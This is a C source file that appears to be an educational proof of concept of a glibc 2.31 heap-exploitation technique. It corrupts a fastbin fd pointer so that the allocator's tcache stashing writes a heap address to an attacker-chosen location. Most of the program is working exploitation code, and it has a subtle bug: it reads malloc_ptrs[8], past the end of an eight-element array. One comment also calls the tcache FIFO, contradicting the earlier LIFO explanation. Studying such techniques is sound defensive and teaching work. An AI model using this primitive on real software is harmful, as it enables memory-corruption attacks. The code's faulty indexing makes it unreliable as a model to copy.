#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdint.h>

/*
The TCache is extremely GREEDY. 
When iterating over a chunk in the fastbins or smallbins, 
the allocator will check to see if there are OTHER chunks
here that will fit into the TCache. Essentially, it is 
STEALING the chunks and putting them into the TCache. 

The code for the fastbin stashing is shown below: 
- https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3597
```
	// Above... getting a chunk from the fastbins...

3597:	// While we're here, if we see other chunks of the same size,
	// stash them in the tcache
	size_t tc_idx = csize2tidx (nb);
	if (tcache && tc_idx < mp_.tcache_bins){
 		mchunkptr tc_victim;

		// While bin not empty and tcache not full, copy chunks.
 		while (tcache->counts[tc_idx] < mp_.tcache_count
		      && (tc_victim = *fb) != NULL){

			*fb = tc_victim->fd; 
			tcache_put(tc_victim, tc_idx); 
		}
	}

```
At this point in the program, a chunk has already been taken 
out of the fastbin. Now, this code is checking IF there
are more chunks in the fastbin that we want to take out
to go into the TCache bin. 

The 'while loop' is what we are most concerned about. 
There are two conditions for it to keep looking
for more chunks: 
- Is the tcache bin NOT full? Rememeber, there is a cap at 7 by default. 
- Are there are chunks in this fastbin? Remember, the END is denoted with a NULL entry. 

If the tcache is NOT full and the fastbin has chunks, then it will 
remove a chunk from the fastbin (*fb = tc_victim->fd) and insert
it into the tcache bin (tcache_put(tc_victim, tc_idx)). 


So, what happens if we corrupt one of the 'fd' pointers in 
the fastbin linked list? If we do this, then we gain access 
to writing a heap address to ANYWHERE in memory. Why? Let's
view the code below: 

```
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
2920:	tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
2921:	e->key = tcache; // Double free protection
2926:	e->next = tcache->entries[tc_idx]; // 'fd' pointer
2927:	tcache->entries[tc_idx] = e;
2928:	++(tcache->counts[tc_idx]);
}
```

The TCache is Last In First Out (LIFO) like a stack is. 
This means that the most recently freed chunk sits at the 
top of the linked list. To insert an item, it must set
the OLD head to be the 'next' (fd) pointer of this chunk; 
this is done at line 2926 shown above. If the 'fd' pointer 
of our fastbin is corrupt, it will BLINDLY add the chunk
without size verification and write a heap address to
our chunk + 0x10. Neat! Arbirary write WHERE primitive 
with a heap address. 

There are a few caveats with this: 
- The 'next' location of our pointer should be NULL. 
  Otherwise, the fastbin is broken. There is a small 
  work around for this though. 
- If it is NOT null, then it MUST be the chunk that fills
  up the TCache bin. Otherwise, it will attempt to dereference
  this value and use it as a pointer. 

The demo below shows an arbitrary write WHERE primitive
to write the address of the heap to an integer. To make
this easier to read, the address + 0x10 will be NULL. 

NOTES: 
* This can also be used for an 'fd poison' attack, where
  the chunk would NOT have bypassed the size check in the fastbin
  but WOULD in the tcache. 
* Smallbin variation is quite similar.  

*/
size_t target = 0;  // Attacking HERE

int main(){

	setbuf(stdout, NULL);

	size_t* malloc_ptrs[8];
	size_t* victim_chunk; 
	size_t size = 0x50 - 0x10; // Chunk size of 0x50

	// Allocate chunks to fill up the tcache later
	for(int index = 0; index < 8; index++){
		malloc_ptrs[index] = malloc(size);
	}

	// Fill up the TCache
	for(int index = 0; index < 7; index++){
		free(malloc_ptrs[index]);
	}

	// Our TARGET chunk in the bin
	victim_chunk = malloc_ptrs[8]; 		

	/* 
	Insert two chunks into the fastbin by freeing.
	After freeing both of these, the bins
	will look as follows: 
	tcache: 
	0x50: 6->5->4->3->2->1->0
	fastbins: 
	* 0x50: 7->8

	Remember, the fastbin and tcache are FIFO.
	*/
	free(victim_chunk); // malloc_ptrs[8]
	free(malloc_ptrs[7]);

	/*
	Point the 'fd' pointer of the fastbin entry to 
	be at our target. 
	When the write actually occurs, it writes to 
	'chunk->fd'. In order to write to the EXACT 
	proper location, we must subtract 0x10 since
	'chunk->fd' is the same as 'chunk + 0x10'. 
	By subtracting 0x10 on the supplied address
	(like with unlink) we end up with '-0x10+0x10+target', 
	which is just the 'target.

	Now, the bins look like: 
	tcache: 
	0x50: 6->5->4->3->2->1->0
	fastbins: 
	* 0x50: 7->8->target
	-  
	*/
	victim_chunk[0] = (size_t) ((uint8_t*)&target - 0x10);

	/*
	Remove ALL of the chunks from the 0x50 tcache bin. At the
	end, it will look as follows: 
	
	fastbins: 
	* 0x50: 7->8->target
	*/
	for(int index = 0; index < 7; index++){
		malloc(size); 
	}

	/*
	At this point, we have NO chunks in the tcache 
	and two chunks in the fastbin. As a result, when
	we make this allocation, the allocator will do the 
	following: 
		1. Take a chunk out of the fastbin to give
		  back to the user. This will be malloc_ptrs[7].
		2. Stash the chunk at malloc_ptrs[8].
		3. Attempt to stash the 'fd' pointer 
		  at the end of the fastbin. This is where we
		  put our FAKE pointer to perform the write. 
	
	Now, when we perform the write, we will do the following: 
		* target = tcache_chunk_head->fd
	
	This is where the WRITE actually occurs at (in 'tcache_put').
	To see this in action, I reccommend setting a
	breakpoint at the stashing code within _int_malloc
	in order to see this happen in action.
	*/
	printf("Target Before: 0x%lx\n", target);
	malloc(size);
	printf("Target After: 0x%lx\n", target);
}
